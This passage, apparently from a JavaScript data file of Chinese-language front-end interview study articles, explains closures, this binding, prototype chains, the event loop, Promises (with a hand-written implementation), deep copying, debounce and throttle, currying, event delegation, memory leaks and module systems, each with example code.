**3. 循环中的闭包问题（经典面试题）**：

\`\`\`javascript
// 问题代码
for (var i = 0; i < 5; i++) {
  setTimeout(function() {
    console.log(i); // 输出 5 个 5
  }, i * 1000);
}

// 解决方案一：使用 let（块级作用域）
for (let i = 0; i < 5; i++) {
  setTimeout(function() {
    console.log(i); // 输出 0, 1, 2, 3, 4
  }, i * 1000);
}

// 解决方案二：使用闭包
for (var i = 0; i < 5; i++) {
  (function(j) {
    setTimeout(function() {
      console.log(j); // 输出 0, 1, 2, 3, 4
    }, j * 1000);
  })(i);
}

// 解决方案三：使用 setTimeout 的第三个参数
for (var i = 0; i < 5; i++) {
  setTimeout(function(j) {
    console.log(j);
  }, i * 1000, i);
}
\`\`\`

### 5.4 闭包的缺点

- **内存泄漏**：闭包会保持对外部变量的引用，导致外部变量无法被垃圾回收
- **性能开销**：闭包需要维护额外的引用关系

**解决方案**：在不需要时手动释放引用：

\`\`\`javascript
function createClosure() {
  let largeData = new Array(1000000);
  return function() {
    // 使用 largeData
  };
}

const closure = createClosure();
// 使用完后，手动释放
// closure = null;
\`\`\`

---

## 六、this 关键字

### 6.1 this 的四种绑定规则

**1. 默认绑定**（独立函数调用）：

\`\`\`javascript
function foo() {
  console.log(this); // window（严格模式下是 undefined）
}
foo();
\`\`\`

**2. 隐式绑定**（作为对象方法调用）：

\`\`\`javascript
const obj = {
  name: 'obj',
  foo: function() {
    console.log(this.name);
  }
};
obj.foo(); // "obj"
\`\`\`

**隐式丢失**：

\`\`\`javascript
const obj = {
  name: 'obj',
  foo: function() {
    console.log(this.name);
  }
};

const bar = obj.foo;
bar(); // undefined（变成了默认绑定）

// 回调函数也会丢失 this
setTimeout(obj.foo, 1000); // undefined
\`\`\`

**3. 显式绑定**（call / apply / bind）：

\`\`\`javascript
function greet(greeting) {
  console.log(greeting + ', ' + this.name);
}

const person = { name: '张三' };

// call：逐个传参
greet.call(person, 'Hello'); // "Hello, 张三"

// apply：数组传参
greet.apply(person, ['Hi']); // "Hi, 张三"

// bind：返回新函数，不立即执行
const boundGreet = greet.bind(person, 'Hey');
boundGreet(); // "Hey, 张三"
\`\`\`

**4. new 绑定**（构造函数）：

\`\`\`javascript
function Person(name) {
  this.name = name;
}

const p = new Person('张三');
console.log(p.name); // "张三"
// new 做了什么：
// 1. 创建一个空对象
// 2. 将空对象的 __proto__ 指向构造函数的 prototype
// 3. 将构造函数的 this 绑定到空对象
// 4. 执行构造函数
// 5. 返回新对象（如果构造函数返回非对象，则返回新对象）
\`\`\`

### 6.2 绑定优先级

\`new 绑定 > 显式绑定 > 隐式绑定 > 默认绑定\`

\`\`\`javascript
// 验证：显式绑定 vs 隐式绑定
const obj = { foo: function() { console.log(this.name); } };
const obj2 = { name: 'obj2' };
obj.foo.call(obj2); // "obj2"（显式绑定优先）

// 验证：new 绑定 vs 显式绑定
function Foo(name) { this.name = name; }
const BoundFoo = Foo.bind({ name: 'bound' });
const f = new BoundFoo('new');
console.log(f.name); // "new"（new 绑定优先）
\`\`\`

### 6.3 箭头函数的 this

箭头函数没有自己的 this，它的 this 继承自外层作用域（定义时的上下文）。

\`\`\`javascript
const obj = {
  name: 'obj',
  foo: function() {
    // 普通函数：this 指向 obj
    setTimeout(function() {
      console.log(this.name); // undefined（this 指向 window）
    }, 1000);

    // 箭头函数：this 继承自 foo（外层作用域）
    setTimeout(() => {
      console.log(this.name); // "obj"
    }, 1000);
  }
};

obj.foo();
\`\`\`

**箭头函数的 this 不能改变**：

\`\`\`javascript
const arrow = () => {
  console.log(this);
};

arrow.call({ name: 'test' }); // 仍然指向定义时的 this（window）
// call/apply/bind 对箭头函数无效
\`\`\`

---

## 七、原型链

### 7.1 原型的基本概念

\`\`\`javascript
// 每个函数都有 prototype 属性（指向原型对象）
function Person(name) {
  this.name = name;
}

// 每个对象都有 __proto__ 属性（指向构造函数的 prototype）
const p = new Person('张三');

console.log(p.__proto__ === Person.prototype); // true
console.log(Person.prototype.constructor === Person); // true
console.log(Object.getPrototypeOf(p) === Person.prototype); // true（推荐用法）
\`\`\`

### 7.2 原型链

当访问一个对象的属性时，如果对象本身没有该属性，就会沿着 \`__proto__\` 向上查找，直到找到或到达 \`null\`。这条链路就是**原型链**。

\`\`\`javascript
function Person(name) {
  this.name = name;
}
Person.prototype.sayHello = function() {
  console.log('Hello, ' + this.name);
};

const p = new Person('张三');
p.sayHello(); // "Hello, 张三"（从原型上找到的）

// 原型链：
// p → Person.prototype → Object.prototype → null
console.log(p.__proto__.__proto__ === Object.prototype); // true
console.log(p.__proto__.__proto__.__proto__); // null
\`\`\`

### 7.3 原型链继承

\`\`\`javascript
// 父类
function Animal(name) {
  this.name = name;
}
Animal.prototype.eat = function() {
  console.log(this.name + ' is eating');
};

// 子类
function Dog(name, breed) {
  Animal.call(this, name); // 继承属性
  this.breed = breed;
}

// 继承方法
Dog.prototype = Object.create(Animal.prototype);
Dog.prototype.constructor = Dog;

Dog.prototype.bark = function() {
  console.log('Woof!');
};

const dog = new Dog('旺财', '金毛');
dog.eat();  // "旺财 is eating"
dog.bark(); // "Woof!"

// 原型链：
// dog → Dog.prototype → Animal.prototype → Object.prototype → null
\`\`\`

### 7.4 instanceof 原理

\`instanceof\` 检查的是：构造函数的 \`prototype\` 是否在对象的原型链上。

\`\`\`javascript
function myInstanceof(obj, constructor) {
  let proto = Object.getPrototypeOf(obj);

  while (proto) {
    if (proto === constructor.prototype) return true;
    proto = Object.getPrototypeOf(proto);
  }

  return false;
}

console.log(dog instanceof Dog);    // true
console.log(dog instanceof Animal); // true
console.log(dog instanceof Object); // true
\`\`\`

### 7.5 Object.create 与 new 的区别

\`\`\`javascript
// Object.create：创建一个新对象，新对象的 __proto__ 指向传入的对象
const proto = { greet: function() { return 'hello'; } };
const obj = Object.create(proto);
console.log(obj.greet()); // "hello"

// new：创建一个新对象，执行构造函数，将新对象的 __proto__ 指向构造函数的 prototype
function Foo() { this.value = 42; }
const foo = new Foo();
console.log(foo.value); // 42
\`\`\`

---

## 八、事件循环（Event Loop）

### 8.1 JavaScript 的单线程模型

JavaScript 是单线程语言，但通过事件循环机制实现了异步非阻塞的特性。

### 8.2 宏任务和微任务

| 类型 | 任务 | 说明 |
|------|------|------|
| 宏任务（MacroTask） | script、setTimeout、setInterval、I/O、UI rendering、setImmediate（Node.js） | 每次只执行一个宏任务 |
| 微任务（MicroTask） | Promise.then/catch/finally、MutationObserver、queueMicrotask、process.nextTick（Node.js） | 每个宏任务执行完后，清空所有微任务队列 |

### 8.3 事件循环的执行顺序

1. 执行一个宏任务（从宏任务队列中取出一个）
2. 执行所有微任务（清空微任务队列）
3. 如有必要，渲染 UI
4. 重复以上步骤

\`\`\`javascript
console.log('1'); // 同步代码

setTimeout(() => {
  console.log('2'); // 宏任务
}, 0);

Promise.resolve().then(() => {
  console.log('3'); // 微任务
});

console.log('4'); // 同步代码

// 输出顺序：1 → 4 → 3 → 2
// 解释：
// 1. 执行同步代码，输出 1 和 4
// 2. 清空微任务队列，输出 3
// 3. 执行下一个宏任务（setTimeout），输出 2
\`\`\`

### 8.4 经典面试题：async/await 与事件循环

\`\`\`javascript
async function async1() {
  console.log('async1 start');
  await async2();
  console.log('async1 end'); // await 后面的代码相当于 Promise.then 中的微任务
}

async function async2() {
  console.log('async2');
}

console.log('script start');

setTimeout(() => {
  console.log('setTimeout');
}, 0);

async1();

new Promise((resolve) => {
  console.log('promise1');
  resolve();
}).then(() => {
  console.log('promise2');
});

console.log('script end');

// 输出顺序：
// script start
// async1 start
// async2
// promise1
// script end
// async1 end
// promise2
// setTimeout
\`\`\`

### 8.5 Node.js 中的事件循环

Node.js 的事件循环分为 6 个阶段：
1. **timers**：执行 setTimeout、setInterval 的回调
2. **pending callbacks**：执行延迟到下一个循环的 I/O 回调
3. **idle, prepare**：内部使用
4. **poll**：获取新的 I/O 事件
5. **check**：执行 setImmediate 回调
6. **close callbacks**：执行 close 事件回调

\`\`\`javascript
// Node.js 中 setTimeout 和 setImmediate 的执行顺序不确定
setTimeout(() => console.log('timeout'), 0);
setImmediate(() => console.log('immediate'));

// process.nextTick 优先级高于 Promise
process.nextTick(() => console.log('nextTick'));
Promise.resolve().then(() => console.log('promise'));
// 输出：nextTick → promise
\`\`\`

---

## 九、Promise

### 9.1 Promise 的三种状态

- **pending**（待定）：初始状态
- **fulfilled**（已兑现）：操作成功
- **rejected**（已拒绝）：操作失败

状态一旦改变，就不会再变。pending → fulfilled 或 pending → rejected。

### 9.2 Promise 的基本用法

\`\`\`javascript
const promise = new Promise((resolve, reject) => {
  setTimeout(() => {
    const success = Math.random() > 0.5;
    if (success) {
      resolve('成功');
    } else {
      reject(new Error('失败'));
    }
  }, 1000);
});

promise
  .then(result => {
    console.log(result); // "成功"
    return result + '!';
  })
  .then(result => {
    console.log(result); // "成功!"
  })
  .catch(error => {
    console.error(error.message); // "失败"
  })
  .finally(() => {
    console.log('无论成功还是失败都会执行');
  });
\`\`\`

### 9.3 Promise 的静态方法

**Promise.resolve / Promise.reject**：

\`\`\`javascript
Promise.resolve(42).then(v => console.log(v)); // 42
Promise.reject(new Error('err')).catch(e => console.log(e.message)); // "err"
\`\`\`

**Promise.all**：全部成功才成功，一个失败就失败。

\`\`\`javascript
Promise.all([
  Promise.resolve(1),
  Promise.resolve(2),
  Promise.resolve(3)
]).then(results => {
  console.log(results); // [1, 2, 3]
});

Promise.all([
  Promise.resolve(1),
  Promise.reject('error'),
  Promise.resolve(3)
]).catch(error => {
  console.log(error); // "error"（第一个失败的结果）
});
\`\`\`

**Promise.allSettled**：等待所有 Promise 完成，无论成功或失败。

\`\`\`javascript
Promise.allSettled([
  Promise.resolve(1),
  Promise.reject('error'),
  Promise.resolve(3)
]).then(results => {
  console.log(results);
  // [
  //   { status: 'fulfilled', value: 1 },
  //   { status: 'rejected', reason: 'error' },
  //   { status: 'fulfilled', value: 3 }
  // ]
});
\`\`\`

**Promise.race**：返回第一个完成的 Promise 的结果。

\`\`\`javascript
Promise.race([
  new Promise(resolve => setTimeout(() => resolve('慢'), 500)),
  new Promise(resolve => setTimeout(() => resolve('快'), 100))
]).then(result => {
  console.log(result); // "快"
});
\`\`\`

**Promise.any**：返回第一个成功的 Promise，全部失败才报错。

\`\`\`javascript
Promise.any([
  Promise.reject('error1'),
  Promise.resolve('success'),
  Promise.reject('error2')
]).then(result => {
  console.log(result); // "success"
});
\`\`\`

### 9.4 async/await

async/await 是 Promise 的语法糖，使异步代码看起来像同步代码。

\`\`\`javascript
// Promise 写法
function fetchData() {
  return fetch('/api/data')
    .then(response => response.json())
    .then(data => {
      console.log(data);
    })
    .catch(error => {
      console.error(error);
    });
}

// async/await 写法
async function fetchData() {
  try {
    const response = await fetch('/api/data');
    const data = await response.json();
    console.log(data);
  } catch (error) {
    console.error(error);
  }
}
\`\`\`

**async 函数的返回值**：

\`\`\`javascript
async function foo() {
  return 42; // 等价于 return Promise.resolve(42)
}

foo().then(v => console.log(v)); // 42
\`\`\`

**错误处理**：

\`\`\`javascript
async function fetchWithError() {
  try {
    const response = await fetch('/api/data');
    if (!response.ok) {
      throw new Error('网络请求失败');
    }
    return await response.json();
  } catch (error) {
    console.error('请求出错:', error);
    return null;
  }
}
\`\`\`

**并发执行**：

\`\`\`javascript
// 串行执行（慢）
async function serial() {
  const a = await fetchA(); // 等待 A 完成
  const b = await fetchB(); // 再等待 B 完成
  return [a, b];
}

// 并行执行（快）
async function parallel() {
  const [a, b] = await Promise.all([fetchA(), fetchB()]);
  return [a, b];
}
\`\`\`

### 9.5 手写 Promise

这是一个高频面试题，需要理解 Promise 的核心原理。

\`\`\`javascript
class MyPromise {
  constructor(executor) {
    this.state = 'pending';
    this.value = undefined;
    this.reason = undefined;
    this.onFulfilledCallbacks = [];
    this.onRejectedCallbacks = [];

    const resolve = (value) => {
      if (this.state === 'pending') {
        this.state = 'fulfilled';
        this.value = value;
        this.onFulfilledCallbacks.forEach(fn => fn());
      }
    };

    const reject = (reason) => {
      if (this.state === 'pending') {
        this.state = 'rejected';
        this.reason = reason;
        this.onRejectedCallbacks.forEach(fn => fn());
      }
    };

    try {
      executor(resolve, reject);
    } catch (error) {
      reject(error);
    }
  }

  then(onFulfilled, onRejected) {
    onFulfilled = typeof onFulfilled === 'function' ? onFulfilled : v => v;
    onRejected = typeof onRejected === 'function' ? onRejected : e => { throw e; };

    const promise2 = new MyPromise((resolve, reject) => {
      if (this.state === 'fulfilled') {
        setTimeout(() => {
          try {
            const x = onFulfilled(this.value);
            this.resolvePromise(promise2, x, resolve, reject);
          } catch (error) {
            reject(error);
          }
        }, 0);
      }

      if (this.state === 'rejected') {
        setTimeout(() => {
          try {
            const x = onRejected(this.reason);
            this.resolvePromise(promise2, x, resolve, reject);
          } catch (error) {
            reject(error);
          }
        }, 0);
      }

      if (this.state === 'pending') {
        this.onFulfilledCallbacks.push(() => {
          setTimeout(() => {
            try {
              const x = onFulfilled(this.value);
              this.resolvePromise(promise2, x, resolve, reject);
            } catch (error) {
              reject(error);
            }
          }, 0);
        });

        this.onRejectedCallbacks.push(() => {
          setTimeout(() => {
            try {
              const x = onRejected(this.reason);
              this.resolvePromise(promise2, x, resolve, reject);
            } catch (error) {
              reject(error);
            }
          }, 0);
        });
      }
    });

    return promise2;
  }

  resolvePromise(promise2, x, resolve, reject) {
    if (promise2 === x) {
      return reject(new TypeError('Chaining cycle detected'));
    }

    if (x instanceof MyPromise) {
      x.then(resolve, reject);
    } else if (x !== null && (typeof x === 'object' || typeof x === 'function')) {
      let called = false;
      try {
        const then = x.then;
        if (typeof then === 'function') {
          then.call(x,
            y => {
              if (called) return;
              called = true;
              this.resolvePromise(promise2, y, resolve, reject);
            },
            r => {
              if (called) return;
              called = true;
              reject(r);
            }
          );
        } else {
          resolve(x);
        }
      } catch (error) {
        if (called) return;
        called = true;
        reject(error);
      }
    } else {
      resolve(x);
    }
  }

  catch(onRejected) {
    return this.then(null, onRejected);
  }

  finally(onFinally) {
    return this.then(
      value => MyPromise.resolve(onFinally()).then(() => value),
      reason => MyPromise.resolve(onFinally()).then(() => { throw reason; })
    );
  }

  static resolve(value) {
    if (value instanceof MyPromise) return value;
    return new MyPromise(resolve => resolve(value));
  }

  static reject(reason) {
    return new MyPromise((_, reject) => reject(reason));
  }

  static all(promises) {
    return new MyPromise((resolve, reject) => {
      const results = [];
      let count = 0;

      if (promises.length === 0) return resolve(results);

      promises.forEach((promise, index) => {
        MyPromise.resolve(promise).then(value => {
          results[index] = value;
          count++;
          if (count === promises.length) resolve(results);
        }, reject);
      });
    });
  }

  static race(promises) {
    return new MyPromise((resolve, reject) => {
      promises.forEach(promise => {
        MyPromise.resolve(promise).then(resolve, reject);
      });
    });
  }
}
\`\`\`

---

## 十、常见面试题

### 面试题 1：判断数据类型的方法有哪些？

1. **typeof**：可以判断基本类型（除了 null），但无法区分对象和数组
2. **instanceof**：判断对象是否在原型链上，但不能判断基本类型
3. **Object.prototype.toString.call()**：最准确，返回 [object Type]
4. **Array.isArray()**：专门判断数组

### 面试题 2：== 和 === 的区别？

\`==\` 是宽松相等，比较时会发生类型转换。\`===\` 是严格相等，不会进行类型转换。建议始终使用 \`===\`，除非明确需要 \`==\` 的类型转换特性。

### 面试题 3：什么是闭包？有什么优缺点？

闭包是指函数能够访问其外部作用域中的变量。优点是：实现数据私有化、创建函数工厂、实现柯里化。缺点是：可能导致内存泄漏，因为闭包会保持对外部变量的引用。

### 面试题 4：如何改变 this 指向？

使用 call、apply、bind 或箭头函数。call 和 apply 立即执行，bind 返回新函数。箭头函数的 this 继承自外层作用域。

### 面试题 5：什么是事件循环？

JavaScript 是单线程的，通过事件循环实现异步。事件循环不断从宏任务队列中取出任务执行，每个宏任务执行完后清空微任务队列。微任务优先级高于宏任务。

---

## 总结

JavaScript 基础是前端面试的重中之重。数据类型、作用域、闭包、this、原型链、事件循环这六大核心概念，几乎每场面试都会涉及。掌握这些概念不仅是为了通过面试，更是为了写出高质量的代码。

**核心记忆点**：
1. 7 种原始类型 + 1 种引用类型，typeof null 是历史遗留 bug
2. 闭包 = 函数 + 外部变量引用，用于数据私有化和函数工厂
3. this 的 4 种绑定规则：new > 显式 > 隐式 > 默认
4. 原型链：p → Person.prototype → Object.prototype → null
5. 事件循环：宏任务 → 微任务队列 → 渲染 → 下一个宏任务
6. Promise 三种状态，async/await 是语法糖
`
  },
  {
    id: "fe-js-advanced",
    group: "基础能力",
    icon: "⚡",
    title: "JavaScript 进阶考点与面试技巧",
    content: `

# JavaScript 进阶考点与面试技巧

## 一、深拷贝与浅拷贝

### 1.1 什么是浅拷贝

浅拷贝只复制对象的第一层属性，如果属性值是引用类型，则复制的是引用地址。

\`\`\`javascript
// 浅拷贝方法
const obj = { a: 1, b: { c: 2 } };

// 方法一：Object.assign
const shallow1 = Object.assign({}, obj);

// 方法二：展开运算符
const shallow2 = { ...obj };

// 方法三：数组的 slice/concat
const arr = [1, [2, 3]];
const shallow3 = arr.slice();
const shallow4 = [].concat(arr);

// 浅拷贝的问题
shallow1.b.c = 999;
console.log(obj.b.c); // 999（原对象也被修改了！）
\`\`\`

### 1.2 什么是深拷贝

深拷贝会递归复制所有层级的属性，完全独立于原对象。

\`\`\`javascript
// 方法一：JSON.parse(JSON.stringify())（有局限性）
const obj = { a: 1, b: { c: 2 } };
const deep = JSON.parse(JSON.stringify(obj));
deep.b.c = 999;
console.log(obj.b.c); // 2（原对象不受影响）

// JSON 方法的局限性：
// 1. 无法处理 undefined、Symbol、函数（会被忽略或转成 null）
// 2. 无法处理循环引用（会报错）
// 3. 无法处理 Date、RegExp、Map、Set 等特殊对象
// 4. 无法处理原型链
\`\`\`

### 1.3 手写深拷贝

\`\`\`javascript
function deepClone(obj, hash = new WeakMap()) {
  // 基本类型直接返回
  if (obj === null || typeof obj !== 'object') return obj;

  // 处理 Date
  if (obj instanceof Date) return new Date(obj);

  // 处理 RegExp
  if (obj instanceof RegExp) return new RegExp(obj);

  // 处理循环引用
  if (hash.has(obj)) return hash.get(obj);

  // 处理数组和对象
  const cloneObj = Array.isArray(obj) ? [] : {};

  hash.set(obj, cloneObj);

  // 处理 Symbol 属性
  const keys = [
    ...Object.keys(obj),
    ...Object.getOwnPropertySymbols(obj)
  ];

  for (const key of keys) {
    cloneObj[key] = deepClone(obj[key], hash);
  }

  return cloneObj;
}

// 进阶版：支持 Map、Set
function deepCloneAdvanced(obj, hash = new WeakMap()) {
  if (obj === null || typeof obj !== 'object') return obj;

  if (obj instanceof Date) return new Date(obj);
  if (obj instanceof RegExp) return new RegExp(obj);

  if (hash.has(obj)) return hash.get(obj);

  let cloneObj;

  if (obj instanceof Map) {
    cloneObj = new Map();
    hash.set(obj, cloneObj);
    obj.forEach((value, key) => {
      cloneObj.set(key, deepCloneAdvanced(value, hash));
    });
    return cloneObj;
  }

  if (obj instanceof Set) {
    cloneObj = new Set();
    hash.set(obj, cloneObj);
    obj.forEach(value => {
      cloneObj.add(deepCloneAdvanced(value, hash));
    });
    return cloneObj;
  }

  cloneObj = Array.isArray(obj) ? [] : {};
  hash.set(obj, cloneObj);

  // 处理所有自有属性（包括 Symbol）
  Reflect.ownKeys(obj).forEach(key => {
    cloneObj[key] = deepCloneAdvanced(obj[key], hash);
  });

  return cloneObj;
}
\`\`\`

### 1.4 structuredClone（现代方案）

\`\`\`javascript
// 浏览器原生支持的深拷贝 API（较新）
const obj = {
  a: 1,
  b: { c: 2 },
  d: new Date(),
  e: new Map([['key', 'value']])
};

const cloned = structuredClone(obj);
// 支持循环引用、Date、Map、Set、ArrayBuffer 等
// 不支持：函数、Symbol、DOM 节点
\`\`\`

---

## 二、防抖与节流

### 2.1 防抖（Debounce）

防抖是指：在事件被触发 n 秒后执行回调，如果在这 n 秒内事件又被触发，则重新计时。

**适用场景**：搜索框输入、窗口大小调整、按钮点击防重复提交。

\`\`\`javascript
function debounce(fn, delay) {
  let timer = null;

  return function(...args) {
    // 清除之前的定时器
    if (timer) clearTimeout(timer);

    // 重新设置定时器
    timer = setTimeout(() => {
      fn.apply(this, args);
      timer = null;
    }, delay);
  };
}

// 使用示例
const searchInput = document.getElementById('search');
searchInput.addEventListener('input', debounce(function(e) {
  console.log('搜索:', e.target.value);
  // 发送搜索请求
}, 300));
\`\`\`

**立即执行版防抖**：

\`\`\`javascript
function debounce(fn, delay, immediate = false) {
  let timer = null;

  return function(...args) {
    const callNow = immediate && !timer;

    if (timer) clearTimeout(timer);

    timer = setTimeout(() => {
      timer = null;
      if (!immediate) {
        fn.apply(this, args);
      }
    }, delay);

    if (callNow) {
      fn.apply(this, args);
    }
  };
}

// 使用：第一次立即执行，之后 300ms 内不再执行
button.addEventListener('click', debounce(handleClick, 300, true));
\`\`\`

### 2.2 节流（Throttle）

节流是指：在 n 秒内只执行一次回调，无论事件触发多少次。

**适用场景**：滚动事件、鼠标移动、页面 resize。

\`\`\`javascript
// 时间戳版（第一次立即执行，最后一次不执行）
function throttle(fn, delay) {
  let lastTime = 0;

  return function(...args) {
    const now = Date.now();
    if (now - lastTime >= delay) {
      fn.apply(this, args);
      lastTime = now;
    }
  };
}

// 定时器版（第一次不立即执行，最后一次会执行）
function throttle(fn, delay) {
  let timer = null;

  return function(...args) {
    if (timer) return;

    timer = setTimeout(() => {
      fn.apply(this, args);
      timer = null;
    }, delay);
  };
}

// 综合版（第一次立即执行，最后一次也会执行）
function throttle(fn, delay) {
  let lastTime = 0;
  let timer = null;

  return function(...args) {
    const now = Date.now();
    const remaining = delay - (now - lastTime);

    if (remaining <= 0) {
      if (timer) {
        clearTimeout(timer);
        timer = null;
      }
      fn.apply(this, args);
      lastTime = now;
    } else if (!timer) {
      timer = setTimeout(() => {
        fn.apply(this, args);
        lastTime = Date.now();
        timer = null;
      }, remaining);
    }
  };
}

// 使用示例
window.addEventListener('scroll', throttle(function() {
  console.log('滚动位置:', window.scrollY);
}, 200));
\`\`\`

### 2.3 防抖与节流的区别

| 特性 | 防抖（Debounce） | 节流（Throttle） |
|------|-----------------|-----------------|
| 执行频率 | 连续触发只执行最后一次 | 固定频率执行 |
| 时间感知 | 以最后一次触发为基准 | 以固定时间间隔为基准 |
| 典型场景 | 搜索框输入、窗口 resize | 滚动、鼠标移动 |
| 比喻 | 电梯关门（有人在就一直等） | 红绿灯（固定时间通过） |

---

## 三、函数柯里化与偏函数

### 3.1 柯里化（Currying）

柯里化是指将一个接收多个参数的函数，转换为一系列接收单个参数的函数。

\`\`\`javascript
// 普通函数
function add(a, b, c) {
  return a + b + c;
}

// 柯里化后
function curriedAdd(a) {
  return function(b) {
    return function(c) {
      return a + b + c;
    };
  };
}

console.log(curriedAdd(1)(2)(3)); // 6

// 箭头函数写法
const curriedAdd = a => b => c => a + b + c;
\`\`\`

### 3.2 通用柯里化函数

\`\`\`javascript
function curry(fn) {
  return function curried(...args) {
    // 如果参数数量足够，直接执行
    if (args.length >= fn.length) {
      return fn.apply(this, args);
    }
    // 否则返回一个新函数，继续收集参数
    return function(...nextArgs) {
      return curried.apply(this, args.concat(nextArgs));
    };
  };
}

// 使用
function sum(a, b, c) {
  return a + b + c;
}

const curriedSum = curry(sum);
console.log(curriedSum(1)(2)(3)); // 6
console.log(curriedSum(1, 2)(3)); // 6
console.log(curriedSum(1)(2, 3)); // 6
\`\`\`

### 3.3 偏函数（Partial Application）

偏函数是固定函数的一部分参数，返回一个新函数，接收剩余参数。

\`\`\`javascript
function partial(fn, ...presetArgs) {
  return function(...laterArgs) {
    return fn.apply(this, presetArgs.concat(laterArgs));
  };
}

// 使用
function multiply(a, b, c) {
  return a * b * c;
}

const multiplyBy2 = partial(multiply, 2);
console.log(multiplyBy2(3, 4)); // 24

const multiplyBy2And3 = partial(multiply, 2, 3);
console.log(multiplyBy2And3(4)); // 24
\`\`\`

### 3.4 柯里化的应用场景

**1. 参数复用**：

\`\`\`javascript
// 固定基础 URL
const request = curry(function(baseURL, path, params) {
  return fetch(\`\${baseURL}\${path}\`, params);
});

const apiRequest = request('https://api.example.com');
const userRequest = apiRequest('/users');
const orderRequest = apiRequest('/orders');
\`\`\`

**2. 延迟执行**：

\`\`\`javascript
// 事件绑定中的参数预设
const on = curry(function(event, selector, handler) {
  document.addEventListener(event, function(e) {
    if (e.target.matches(selector)) {
      handler(e);
    }
  });
});

const onClick = on('click');
onClick('.btn', function(e) {
  console.log('按钮被点击');
});
\`\`\`

---

## 四、事件委托

### 4.1 什么是事件委托

事件委托（Event Delegation）是利用事件冒泡机制，将事件处理器绑定到父元素上，通过判断事件目标来统一处理子元素的事件。

### 4.2 事件委托的优势

- **减少内存占用**：只需一个事件处理器，而不是为每个子元素绑定
- **动态元素支持**：新增的子元素自动拥有事件处理能力
- **代码简洁**：集中管理事件逻辑

\`\`\`javascript
// 不使用事件委托（为每个 li 绑定事件）
const items = document.querySelectorAll('#list li');
items.forEach(item => {
  item.addEventListener('click', function() {
    console.log(this.textContent);
  });
});

// 使用事件委托（在父元素上绑定一个事件）
document.getElementById('list').addEventListener('click', function(e) {
  // 判断点击的是否是目标元素
  if (e.target.tagName === 'LI') {
    console.log(e.target.textContent);
  }
});

// 更精确的匹配
document.getElementById('list').addEventListener('click', function(e) {
  const target = e.target.closest('.item');
  if (target && this.contains(target)) {
    console.log(target.dataset.id);
  }
});
\`\`\`

### 4.3 封装通用事件委托

\`\`\`javascript
function delegate(parent, eventType, selector, handler) {
  parent.addEventListener(eventType, function(e) {
    let target = e.target;

    // 冒泡查找匹配的元素
    while (target && target !== parent) {
      if (target.matches(selector)) {
        handler.call(target, e);
        break;
      }
      target = target.parentNode;
    }
  });
}

// 使用
delegate(document.getElementById('list'), 'click', '.item', function(e) {
  console.log('点击了', this.dataset.id);
});
\`\`\`

---

## 五、内存泄漏与垃圾回收

### 5.1 垃圾回收机制

JavaScript 的垃圾回收是自动的，主要使用**标记清除**（Mark-and-Sweep）算法。

**标记清除**：
1. 垃圾回收器从根对象（全局对象）开始，标记所有可达对象
2. 遍历结束后，未被标记的对象被认定为垃圾，进行回收

**引用计数**（旧版 IE 使用）：
- 跟踪每个值被引用的次数
- 引用次数为 0 时回收
- 问题：无法处理循环引用

### 5.2 常见内存泄漏场景

**1. 意外的全局变量**：

\`\`\`javascript
function leak() {
  bar = 'this is a global variable'; // 没有使用 var/let/const
}

// 解决：使用严格模式
'use strict';
function noLeak() {
  bar = 'error'; // ReferenceError
}
\`\`\`

**2. 遗忘的定时器**：

\`\`\`javascript
// 内存泄漏
function startTimer() {
  const largeData = new Array(1000000);
  setInterval(() => {
    console.log(largeData.length); // largeData 永远不会被回收
  }, 1000);
}

// 正确做法
function startTimer() {
  const largeData = new Array(1000000);
  const timerId = setInterval(() => {
    console.log(largeData.length);
  }, 1000);

  // 在合适的时机清除定时器
  return () => clearInterval(timerId);
}
\`\`\`

**3. 脱离 DOM 的引用**：

\`\`\`javascript
const elements = {
  button: document.getElementById('button'),
  text: document.getElementById('text')
};

// 即使从 DOM 中删除了 button，elements.button 仍然持有引用
document.body.removeChild(document.getElementById('button'));
// elements.button 此时指向已脱离 DOM 的元素，但不会被回收
\`\`\`

**4. 闭包引起的内存泄漏**：

\`\`\`javascript
function createClosure() {
  const largeData = new Array(1000000);

  return function() {
    // 只使用了 largeData 的一小部分，但整个 largeData 都被保留
    return largeData[0];
  };
}

// 使用完后手动释放
let closure = createClosure();
// ... 使用 closure
closure = null; // 释放引用
\`\`\`

**5. 事件监听器未移除**：

\`\`\`javascript
// 内存泄漏
function addEventListener() {
  const element = document.getElementById('button');
  element.addEventListener('click', () => {
    console.log('clicked');
  });
  // element 被移除后，事件监听器仍然存在
}

// 正确做法
function addEventListener() {
  const element = document.getElementById('button');
  const handler = () => console.log('clicked');
  element.addEventListener('click', handler);

  return () => element.removeEventListener('click', handler);
}
\`\`\`

### 5.3 内存泄漏检测

\`\`\`javascript
// 使用 Chrome DevTools 的 Memory 面板
// 1. 拍摄堆快照（Heap Snapshot）
// 2. 对比两次快照，观察哪些对象没有被释放
// 3. 使用 Allocation instrumentation on timeline 观察内存分配

// 使用 Performance Monitor 观察 JS Heap Size
// 如果 JS Heap Size 持续增长且不下降，可能存在内存泄漏
\`\`\`

---

## 六、模块系统

### 6.1 CommonJS

Node.js 默认的模块系统。

\`\`\`javascript
// 导出（module.js）
const name = 'module';
const version = '1.0.0';

function greet() {
  console.log('Hello from ' + name);
}

// 方式一：逐个导出
exports.name = name;
exports.version = version;
exports.greet = greet;

// 方式二：整体导出
module.exports = {
  name,
  version,
  greet
};

// 导入（main.js）
const module = require('./module');
module.greet(); // "Hello from module"

// 解构导入
const { name, version } = require('./module');
\`\`\`

**CommonJS 特点**：
- 同步加载，适合服务端
- 运行时加载，值是拷贝
- \`require\` 可以放在任何位置
- 模块加载后会缓存，多次 require 返回同一个对象

### 6.2 ES Module（ESM）

现代浏览器和 Node.js 都支持的模块系统。

\`\`\`javascript
// 导出（module.js）
export const name = 'module';
export const version = '1.0.0';

export function greet() {
  console.log('Hello from ' + name);
}

// 默认导出
const defaultExport = {
  name,
  version,
  greet
};
export default defaultExport;

// 导入（main.js）
// 命名导入
import { name, version, greet } from './module.js';

// 默认导入
import module from './module.js';

// 混合导入
import module, { name, version } from './module.js';

// 全部导入
import * as module from './module.js';

// 动态导入（返回 Promise）
import('./module.js').then(module => {
  module.greet();
});

// 顶级 await（ES2022）
const module = await import('./module.js');
\`\`\`

### 6.3 CommonJS vs ES Module

| 特性 | CommonJS | ES Module |
|------|----------|-----------|
| 语法 | require / module.exports | import / export |
| 加载时机 | 运行时加载 | 编译时加载（静态分析） |
| 值的特性 | 值的拷贝 | 值的引用（只读） |
| 异步加载 | 同步 | 异步 |
| this 指向 | 指向当前模块 | undefined |
